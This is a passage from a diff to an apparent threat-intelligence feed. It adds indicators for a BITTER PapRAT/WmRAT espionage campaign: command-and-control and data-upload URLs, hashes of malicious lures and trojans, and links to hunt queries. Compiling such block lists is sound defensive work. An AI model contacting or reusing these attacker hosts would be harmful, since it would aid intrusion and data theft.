+     "type": "url",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PapRAT C2 panel URL polled every 10 seconds over plain HTTP.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "https://goodnfortunes.com/ucl.php",
+     "type": "url",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Upload endpoint for the abc.pdf reconnaissance file (directory listings, tasklist, antivirus products, drives).",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "https://felixfuturenext.com/Epistemological/",
+     "type": "url",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Campaign URL listed in FortiGuard Labs' BITTER PapRAT IOCs.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "http://gomescareerplans.com/docs",
+     "type": "url",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Command URL that the chain 3 scheduled task contacts with curl.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "a3081df333ca7f18bd90d10a45125ab5011dcf9d2806feae2935f09cab07da4c",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "SHA256 of a malicious BITTER LNK lure that starts the ftp.exe, VHDX or WebDAV infection chain.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "e3992f8c945b0761242377cba32d91b0a390c7cecd79478439843d93e6d2b76b",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "SHA256 of a malicious BITTER LNK lure from the PapRAT campaign.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "ccefbdec2718d864d9d33c743aabfcef88a8d7904d1c598bfcf15cf5f3591c88",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "SHA256 of a malicious BITTER LNK lure from the PapRAT campaign.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "569a21b519aaac8c92f653d708ab6ef34e3f38ea967f47e041d1e2425f6a4b33",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "SHA256 of PapRAT, the remote access trojan dropped by the MSI Type 194 custom action and disguised as bruzsvc.exe ('Microsoft redistributables').",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    },
+    {
+     "value": "411c0b9a2f98b927d806a685faf0c1ab1005647b4816157008892347fb88546b",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "SHA256 of WmRAT (vnces.exe), the second-stage RAT PapRAT downloads, which talks to netmansrvdns.com.",
+     "source_url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+     "source_label": "FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT",
+     "source_name": "Fortinet",
+     "sources": [
+      {
+       "url": "https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat",
+       "name": "Fortinet"
+      }
+     ]
+    }
+   ],
+   "queries": [
+    {
+     "platform": "Defender XDR",
+     "language": "KQL",
+     "name": "hunt.kql",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage/hunt.kql",
+     "download": "BITTER-PapRAT-WmRAT-South-Asia-Espionage_hunt.kql"
+    },
+    {
+     "platform": "Splunk",
+     "language": "SPL",
+     "name": "hunt.spl",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage/hunt.spl",
+     "download": "BITTER-PapRAT-WmRAT-South-Asia-Espionage_hunt.spl",
+     "alt": {
+      "label": "No CIM? Raw-search version",
+      "name": "hunt_raw.spl",
+      "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage/hunt_raw.spl",
+      "download": "BITTER-PapRAT-WmRAT-South-Asia-Espionage_hunt_raw.spl"
+     }
+    },
+    {
+     "platform": "Google SecOps",
+     "language": "YARA-L 2.0",
+     "name": "hunt.yaral",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage/hunt.yaral",
+     "download": "BITTER-PapRAT-WmRAT-South-Asia-Espionage_hunt.yaral"
+    }
+   ]
+  },
   {
    "id": "Check-Point-Gateway-PHP2Shell-TSGA-Backdoor-ESXi-Wiper",
    "folder": "threats/2026-11_November-2026/2026-11-12/Check-Point-Gateway-PHP2Shell-TSGA-Backdoor-ESXi-Wiper",
